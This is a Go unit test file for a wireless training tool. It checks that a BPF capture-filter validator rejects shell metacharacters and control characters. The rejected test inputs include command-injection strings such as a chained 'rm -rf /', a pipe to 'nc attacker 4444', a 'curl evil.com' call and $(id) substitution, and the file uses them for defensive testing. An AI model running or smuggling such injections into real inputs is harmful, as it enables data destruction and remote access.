// Tala WTE - Wireless Training Environment
// Copyright (c) 2026 VTEM Labs. All rights reserved.
// Free for personal and non-profit use. Commercial, paid training, paid CTF,
// or any for-profit use requires a license from VTEM Labs. See the LICENSE file.

package capture

import "testing"

func TestValidateBPFFilterRejectsShellMetacharacters(t *testing.T) {
	cases := []string{
		"port 80; rm -rf /",
		"host 1.2.3.4 | nc attacker 4444",
		"host 1.2.3.4 && curl evil.com",
		"port 80 `id`",
		"port 80 $(id)",
		"port 80 \\ extra",
		`host "1.2.3.4"`,
		"port 80 'quoted'",
		"port {80}",
	}
	for _, c := range cases {
		if err := ValidateBPFFilter(c); err == nil {
			t.Errorf("expected rejection for filter %q, got nil", c)
		}
	}
}

func TestValidateBPFFilterRejectsControlCharacters(t *testing.T) {
	cases := []string{
		"port 80\nport 22",
		"port 80\rport 22",
		"port 80\x00",
	}
	for _, c := range cases {
		if err := ValidateBPFFilter(c); err == nil {
			t.Errorf("expected rejection for filter with control chars %q, got nil", c)
		}
	}
}

func TestValidateBPFFilterAllowsEmpty(t *testing.T) {
	if err := ValidateBPFFilter(""); err != nil {
		t.Errorf("empty filter should pass, got %v", err)
	}
}
